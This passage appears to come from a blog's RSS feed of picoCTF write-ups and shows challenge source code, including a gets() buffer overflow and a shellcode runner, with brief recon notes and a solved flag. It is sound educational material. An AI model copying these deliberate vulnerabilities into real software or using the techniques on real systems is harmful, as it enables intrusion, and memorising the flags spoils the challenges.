 user_pw_hash = hash_pw(user_pw)
 
 if( user_pw_hash == correct_pw_hash ):
 print(&amp;#34;Welcome back... your flag, user:&amp;#34;)
 decryption = str_xor(flag_enc.decode(), user_pw)
 print(decryption)
 return
 print(&amp;#34;That password is incorrect&amp;#34;)



level_4_pw_check()



# The strings below are 100 possibilities for the correct password. 
# (Only 1 is correct)
pos_pw_list = [&amp;#34;6288&amp;#34;, &amp;#34;6152&amp;#34;, &amp;#34;4c7a&amp;#34;, &amp;#34;b722&amp;#34;, &amp;#34;9a6e&amp;#34;, &amp;#34;6717&amp;#34;, &amp;#34;4389&amp;#34;, &amp;#34;1a28&amp;#34;, &amp;#34;37ac&amp;#34;, &amp;#34;de4f&amp;#34;, &amp;#34;eb28&amp;#34;, &amp;#34;351b&amp;#34;, &amp;#34;3d58&amp;#34;, &amp;#34;948b&amp;#34;, &amp;#34;231b&amp;#34;, &amp;#34;973a&amp;#34;, &amp;#34;a087&amp;#34;, &amp;#34;384a&amp;#34;, &amp;#34;6d3c&amp;#34;, &amp;#34;9065&amp;#34;, &amp;#34;725c&amp;#34;, &amp;#34;fd60&amp;#34;, &amp;#34;4d4f&amp;#34;, &amp;#34;6a60&amp;#34;, &amp;#34;7213&amp;#34;, &amp;#34;93e6&amp;#34;, &amp;#34;8c54&amp;#34;, &amp;#34;537d&amp;#34;, &amp;#34;a1da&amp;#34;, &amp;#34;c718&amp;#34;, &amp;#34;9de8&amp;#34;, &amp;#34;ebe3&amp;#34;, &amp;#34;f1c5&amp;#34;, &amp;#34;a0bf&amp;#34;, &amp;#34;ccab&amp;#34;, &amp;#34;4938&amp;#34;, &amp;#34;8f97&amp;#34;, &amp;#34;3327&amp;#34;, &amp;#34;8029&amp;#34;, &amp;#34;41f2&amp;#34;, &amp;#34;a04f&amp;#34;, &amp;#34;c7f9&amp;#34;, &amp;#34;b453&amp;#34;, &amp;#34;90a5&amp;#34;, &amp;#34;25dc&amp;#34;, &amp;#34;26b0&amp;#34;, &amp;#34;cb42&amp;#34;, &amp;#34;de89&amp;#34;, &amp;#34;2451&amp;#34;, &amp;#34;1dd3&amp;#34;, &amp;#34;7f2c&amp;#34;, &amp;#34;8919&amp;#34;, &amp;#34;f3a9&amp;#34;, &amp;#34;b88f&amp;#34;, &amp;#34;eaa8&amp;#34;, &amp;#34;776a&amp;#34;, &amp;#34;6236&amp;#34;, &amp;#34;98f5&amp;#34;, &amp;#34;492b&amp;#34;, &amp;#34;507d&amp;#34;, &amp;#34;18e8&amp;#34;, &amp;#34;cfb5&amp;#34;, &amp;#34;76fd&amp;#34;, &amp;#34;6017&amp;#34;, &amp;#34;30de&amp;#34;, &amp;#34;bbae&amp;#34;, &amp;#34;354e&amp;#34;, &amp;#34;4013&amp;#34;, &amp;#34;3153&amp;#34;, &amp;#34;e9cc&amp;#34;, &amp;#34;cba9&amp;#34;, &amp;#34;25ea&amp;#34;, &amp;#34;c06c&amp;#34;, &amp;#34;a166&amp;#34;, &amp;#34;faf1&amp;#34;, &amp;#34;2264&amp;#34;, &amp;#34;2179&amp;#34;, &amp;#34;cf30&amp;#34;, &amp;#34;4b47&amp;#34;, &amp;#34;3446&amp;#34;, &amp;#34;b213&amp;#34;, &amp;#34;88a3&amp;#34;, &amp;#34;6253&amp;#34;, &amp;#34;db88&amp;#34;, &amp;#34;c38c&amp;#34;, &amp;#34;a48c&amp;#34;, &amp;#34;3e4f&amp;#34;, &amp;#34;7208&amp;#34;, &amp;#34;9dcb&amp;#34;, &amp;#34;fc77&amp;#34;, &amp;#34;e2cf&amp;#34;, &amp;#34;8552&amp;#34;, &amp;#34;f6f8&amp;#34;, &amp;#34;7079&amp;#34;, &amp;#34;42ef&amp;#34;, &amp;#34;391e&amp;#34;, &amp;#34;8a6d&amp;#34;, &amp;#34;2154&amp;#34;, &amp;#34;d964&amp;#34;, &amp;#34;49ec&amp;#34;]
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---ropfu/</guid><description>&lt;h1 id="picoctf---ropfu">
 PicoCTF - ropfu
 &lt;a class="anchor" href="#picoctf---ropfu">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP Chain
x86 Calling Convention:
&lt;a href="https://chromium.googlesource.com/chromiumos/docs/&amp;#43;/master/constants/syscalls.md#x86-32_bit">Linux System Call Table&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFSIZE 16

void vuln() {
 char buf[16];
 printf(&amp;#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&amp;#34;);
 return gets(buf);

}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 

 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---rps/</guid><description>&lt;h1 id="picoctf---rps">
 PicoCTF - RPS
 &lt;a class="anchor" href="#picoctf---rps">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/strstr-in-ccpp/">strstr() in C/C++&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there.
Syntax:&lt;/p></description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---saas/</guid><description>&lt;h1 id="picoctf---saas">
 PicoCTF - SaaS
 &lt;a class="anchor" href="#picoctf---saas">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>seccomp-tool&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;error.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#define SIZE 0x100

// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;amp;arch=x86-64&amp;amp;as_format=inline#assembly
#define HEADER &amp;#34;\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&amp;#34;

#define FLAG_SIZE 64

char flag[FLAG_SIZE];

void load_flag() {
 int fd;
 if ((fd = open(&amp;#34;flag.txt&amp;#34;, O_RDONLY)) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;open flag&amp;#34;);
 if (read(fd, flag, FLAG_SIZE) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;read flag&amp;#34;);
 if (close(fd) == -1)
 error(EXIT_FAILURE, errno, &amp;#34;close flag&amp;#34;);
}

void setup() {
 scmp_filter_ctx ctx;
 ctx = seccomp_init(SCMP_ACT_KILL);
 int ret = 0;
 if (ctx != NULL) {
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
 SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 ret |= seccomp_load(ctx);
 }
 seccomp_release(ctx);
 if (ctx == NULL || ret)
 error(EXIT_FAILURE, 0, &amp;#34;seccomp&amp;#34;);
}

int main()
{
 setbuf(stdout, NULL);
 setbuf(stdin, NULL);
 setbuf(stderr, NULL);

 load_flag();
 puts(&amp;#34;Welcome to Shellcode as a Service!&amp;#34;);

 void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 memcpy(addr, HEADER, sizeof(HEADER));
 read(0, addr + sizeof(HEADER) - 1, SIZE);

 setup();
 goto *addr;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
 PicoCTF - Scavenger Hunt
 &lt;a class="anchor" href="#picoctf---scavenger-hunt">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:55079/">Scavenger Hunt&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://icodding.blogspot.com/2015/10/htaccess.html">.htaccess 使用技巧彙整&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。
概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。
.htaccess 詳解&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit---insp3ct0r--htaccess--ds_store">
 Exploit - &lt;a href="https://bernie6401.github.io/gYsHjI-rSD6Lce-7eF6DyA">Insp3ct0r&lt;/a> + &lt;code>htaccess&lt;/code> + &lt;code>DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---insp3ct0r--htaccess--ds_store">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>HTML + CSS +JS
These files keeps one fragment flag each. Especially &lt;code>js&lt;/code> file&amp;rsquo;s hint: &lt;code>/* How can I keep Google from indexing my website? */&lt;/code>
&lt;img src="https://i.imgur.com/wuX9KLT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Apache server $\to$ &lt;code>.htaccess&lt;/code> file
&lt;img src="https://i.imgur.com/li2z8l4.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mac computer $\to$ &lt;code>.DS_Store&lt;/code> file
&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - scrambled-bytes</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/</guid><description>&lt;h1 id="picoctf---scrambled-bytes">
 PicoCTF - scrambled-bytes
 &lt;a class="anchor" href="#picoctf---scrambled-bytes">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.readfog.com/a/1635090435931213824">盤點一款 Python 發包收包利器 - scapy&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h3 id="只發不收">
 只發不收
 &lt;a class="anchor" href="#%e5%8f%aa%e7%99%bc%e4%b8%8d%e6%94%b6">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>send(pkt, inter&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>, loop&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>, count&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, iface&lt;span style="color:#f92672">=&lt;/span>N) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pkt:數據包
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inter&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>發包間隔時間
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>count&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>發包數量
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iface&lt;span style="color:#960050;background-color:#1e0010">：&lt;/span>網卡接口名稱
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>send()&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>在第三層發包&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>沒有接收功能&lt;span style="color:#960050;background-color:#1e0010">；&lt;/span>send(IP(dst&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;www.baidu.com&amp;#34;&lt;/span>,ttl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>)&lt;span style="color:#f92672">/&lt;/span>ICMP())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sendp()&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>在第二層發包&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>沒有接收功能&lt;span style="color:#960050;background-color:#1e0010">。&lt;/span>sr(Ether()&lt;span style="color:#f92672">/&lt;/span>IP(dst&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;www.baidu.com&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://docs.python.org/zh-tw/3/library/time.html#time.time">time-時間的訪問和轉換&lt;/a>
&lt;a href="https://zhuanlan.zhihu.com/p/602431298">python 的pyshark庫如何使用&lt;/a>
&lt;a href="https://segmentfault.com/a/1190000006064442">PyShark入門(2)：FileCapture和LiveCapture模塊&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python3

import argparse
from progress.bar import IncrementalBar

from scapy.all import *
import ipaddress

import random
from time import time

def check_ip(ip):
 try:
 return ipaddress.ip_address(ip)
 except:
 raise argparse.ArgumentTypeError(f&amp;#39;{ip} is an invalid address&amp;#39;)

def check_port(port):
 try:
 port = int(port)
 if port &amp;lt; 1 or port &amp;gt; 65535:
 raise ValueError
 return port
 except:
 raise argparse.ArgumentTypeError(f&amp;#39;{port} is an invalid port&amp;#39;)

def main(args):
 with open(args.input, &amp;#39;rb&amp;#39;) as f:
 payload = bytearray(f.read())
 random.seed(int(time()))
 random.shuffle(payload)
 with IncrementalBar(&amp;#39;Sending&amp;#39;, max=len(payload)) as bar:
 for b in payload:
 send(
 IP(dst=str(args.destination)) /
 UDP(sport=random.randrange(65536), dport=args.port) /
 Raw(load=bytes([b^random.randrange(256)])),
 verbose=False)
 bar.next()

if __name__==&amp;#39;__main__&amp;#39;:
 parser = argparse.ArgumentParser()
 parser.add_argument(&amp;#39;destination&amp;#39;, help=&amp;#39;destination IP address&amp;#39;, type=check_ip)
 parser.add_argument(&amp;#39;port&amp;#39;, help=&amp;#39;destination port number&amp;#39;, type=check_port)
 parser.add_argument(&amp;#39;input&amp;#39;, help=&amp;#39;input file&amp;#39;)
 main(parser.parse_args())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Scrambled: RSA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/</guid><description>&lt;h1 id="picoctf---scrambled-rsa">
 PicoCTF - Scrambled: RSA
 &lt;a class="anchor" href="#picoctf---scrambled-rsa">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Look at the ciphertext, anything fishy, maybe a little bit long?&lt;/li>
&lt;li>What happens if you encrypt the same input multiple times?&lt;/li>
&lt;li>Is RSA deterministic, why would outputs vary?&lt;/li>
&lt;/ul>
&lt;h2 id="recon---通靈">
 Recon - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#recon---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;p>這一題也是頗有趣但要通靈，可以先亂Try&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ nc mercury.picoctf.net 61477
flag = ...
I will encrypt whatever you give me: b
Here you go: 26990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237
I will encrypt whatever you give me: ba
Here you go: 2699004973557840903068237896554908567634409148106041965530669507822650040067943518091441485384345651795926993802543646237181316747733988751129332049819566771732087961765397407420468704229488779578412271162151048595114284277095132529867781110270620027540689911789424114557560291245144389268725220840201190423748281433709412944662646587136176334777506529508638551296181668932027523016538393747587852449462326357575277427356480410273494280971757044562513629423400967407332448126388859817313684399195291279961899276921240210270110225654310423792352532266414306766344869066386142998118001891330035563388790707576505068944
I will encrypt whatever you give me: bac
Here you go: 482814337094129446626465871361763347775065295086385512961816689320275230165383937475878524494623263575752774273564804102734942809717570445625136294234009674073324481263888598173136843991952912799618992769212402102701102256543104237923525322664143067663448690663861429981180018913300355633887907075765050689449619429085627210113794723864117161956939961066630142420889676674025917593454737310140819887001206562193281145515990410131903949359211712425034234736366286462137700473579439657314154736719868903719111785858132034797052503447042089004862886989401543635700329455353580959453911569277021402998961166474045310601826990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237
...
&lt;/code>&lt;/pre>&lt;p>一開始加密的&lt;code>b&lt;/code>是&lt;code>269900...904237&lt;/code>，第二個加密的&lt;code>ba&lt;/code>是&lt;code>26990...5068944&lt;/code>，但如果仔細看其實第一個加密的密文其實也存在其中，他其實是&lt;code>269900...904237+482814...5068944&lt;/code>，可以加密第三個&lt;code>bac&lt;/code>試看看，也會發現是&lt;code>482814...5068944+961942...3106018+269900...904237&lt;/code>
所以我們可以再往這個方向測試一下，我們知道一開始的flag一定是&lt;code>picoCTF{&lt;/code>，我們加密&lt;code>p&lt;/code>會發現密文其實存在原始的flag密文當中，因此我們可以寫一個腳本，像上一題一樣暴力破解，如果加密的密文有存在原本的flag ciphertext中的話，就代表我們猜對了，反之就繼續找&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
 PicoCTF - Secrets
 &lt;a class="anchor" href="#picoctf---secrets">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: We have several pages hidden. Can you find the one with the flag?&lt;/li>
&lt;li>Hint: folders folders folders&lt;/li>
&lt;/ul>
&lt;p>這一題也是蠻有趣的&lt;/p>
&lt;h2 id="exploit---通靈">
 Exploit - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先看一下網頁的source code，沒什麼特別的地方，但有看到&lt;code>secret/assets/index.css&lt;/code>，所以有一個route是secrets，試看看有甚麼東西
&lt;img src="https://hackmd.io/_uploads/HywRa08_n.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了
&lt;img src="https://hackmd.io/_uploads/HyumC0U_2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Payload: &lt;code>view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/&lt;/code>
Flag: &lt;code>picoCTF{succ3ss_@h3n1c@10n_790d2615}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---seed-spring/</guid><description>&lt;h1 id="picoctf---seed-spring">
 PicoCTF - seed-sPRiNG
 &lt;a class="anchor" href="#picoctf---seed-spring">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int guess_height; // [esp+0h] [ebp-18h] BYREF
 int ans; // [esp+4h] [ebp-14h]
 unsigned int seed; // [esp+8h] [ebp-10h]
 int i; // [esp+Ch] [ebp-Ch]
 int *p_argc; // [esp+10h] [ebp-8h]

 p_argc = &amp;amp;argc;
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;#34; # mmmmm mmmmm \&amp;#34; mm m mmm &amp;#34;);
 puts(&amp;#34; mmm mmm mmm mmm# mmm # \&amp;#34;# # \&amp;#34;# mmm #\&amp;#34;m # m\&amp;#34; \&amp;#34;&amp;#34;);
 puts(&amp;#34; # \&amp;#34; #\&amp;#34; # #\&amp;#34; # #\&amp;#34; \&amp;#34;# # \&amp;#34; #mmm#\&amp;#34; #mmmm\&amp;#34; # # #m # # mm&amp;#34;);
 puts(&amp;#34; \&amp;#34;\&amp;#34;\&amp;#34;m #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; #\&amp;#34;\&amp;#34;\&amp;#34;\&amp;#34; # # \&amp;#34;\&amp;#34;\&amp;#34;m # # \&amp;#34;m # # # # # #&amp;#34;);
 puts(&amp;#34; \&amp;#34;mmm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#mm\&amp;#34; \&amp;#34;#m## \&amp;#34;mmm\&amp;#34; # # \&amp;#34; mm#mm # ## \&amp;#34;mmm\&amp;#34;&amp;#34;);
 puts(&amp;#34; &amp;#34;);
 puts(&amp;amp;unk_A50);
 puts(&amp;amp;unk_A50);
 puts(&amp;#34;Welcome! The game is easy: you jump on a sPRiNG.&amp;#34;);
 puts(&amp;#34;How high will you fly?&amp;#34;);
 puts(&amp;amp;unk_A50);
 fflush(stdout);
 seed = time(0);
 srand(seed);
 for ( i = 1; i &amp;lt;= 30; ++i )
 {
 printf(&amp;#34;LEVEL (%d/30)\n&amp;#34;, i);
 puts(&amp;amp;unk_A50);
 LOBYTE(ans) = rand() &amp;amp; 0xF;
 ans = ans;
 printf(&amp;#34;Guess the height: &amp;#34;);
 fflush(stdout);
 __isoc99_scanf(&amp;#34;%d&amp;#34;, &amp;amp;guess_height);
 fflush(stdin);
 if ( ans != guess_height )
 {
 puts(&amp;#34;WRONG! Sorry, better luck next time!&amp;#34;);
 fflush(stdout);
 exit(-1);
 }
 }
 puts(&amp;#34;Congratulation! You&amp;#39;ve won! Here is your flag:\n&amp;#34;);
 fflush(stdout);
 get_flag();
 fflush(stdout);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Sequences</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---sequences/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---sequences/</guid><description>&lt;h1 id="picoctf---sequences">
 PicoCTF - Sequences
 &lt;a class="anchor" href="#picoctf---sequences">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import math
import hashlib
import sys
from tqdm import tqdm
import functools

ITERS = int(2e7)
VERIF_KEY = &amp;#34;96cc5f3b460732b442814fd33cf8537c&amp;#34;
ENCRYPTED_FLAG = bytes.fromhex(&amp;#34;42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b&amp;#34;)

# This will overflow the stack, it will need to be significantly optimized in order to get the answer :)
@functools.cache
def m_func(i):
 if i == 0: return 1
 if i == 1: return 2
 if i == 2: return 3
 if i == 3: return 4

 return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1)


# Decrypt the flag
def decrypt_flag(sol):
 sol = sol % (10**10000)
 sol = str(sol)
 sol_md5 = hashlib.md5(sol.encode()).hexdigest()

 if sol_md5 != VERIF_KEY:
 print(&amp;#34;Incorrect solution&amp;#34;)
 sys.exit(1)

 key = hashlib.sha256(sol.encode()).digest()
 flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode()

 print(flag)

if __name__ == &amp;#34;__main__&amp;#34;:
 sol = m_func(ITERS)
 decrypt_flag(sol)
